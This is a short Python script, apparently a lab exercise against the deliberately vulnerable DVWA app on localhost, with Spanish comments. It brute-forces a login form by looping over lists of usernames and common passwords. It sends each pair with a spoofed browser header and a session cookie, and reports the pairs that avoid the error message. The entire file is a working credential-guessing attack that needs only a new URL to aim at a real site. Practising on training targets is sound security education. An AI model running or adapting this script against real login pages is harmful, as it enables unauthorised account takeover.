import requests

def brute_force_login(url, usernames, passwords):
    valid_credentials = []
    
    for username in usernames:
        for password in passwords:
            payload = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'Referer': 'http://localhost:8081/vulnerabilities/brute/',
                'Cookie': 'PHPSESSID=7b1uu8mbj6s0cgi6lfk1jt8q53; security=low'
            }
            response = requests.get(url, params=payload, headers=headers)
            
            if "Username and/or password incorrect" not in response.text:
                valid_credentials.append((username, password))
                print(f"Credenciales válidas encontradas: {username}:{password}")
    
    return valid_credentials

# URL del formulario de inicio de sesión
url = 'http://localhost:8081/vulnerabilities/brute/'

# Listas de nombres de usuario y contraseñas a probar
usernames = ['admin', '1337', 'diego', 'pablo', 'gordonb', 'smithy']
passwords = ['password','abc123' ,'password344' ,'charley' , 'qwerty', 'letmein']

print("Iniciando ataque de fuerza bruta...")
valid_credentials = brute_force_login(url, usernames, passwords)

if valid_credentials:
    print("\nTodas las combinaciones válidas encontradas:")
    for username, password in valid_credentials:
        print(f"Usuario: {username}, Contraseña: {password}")
else:
    print("No se encontraron credenciales válidas.")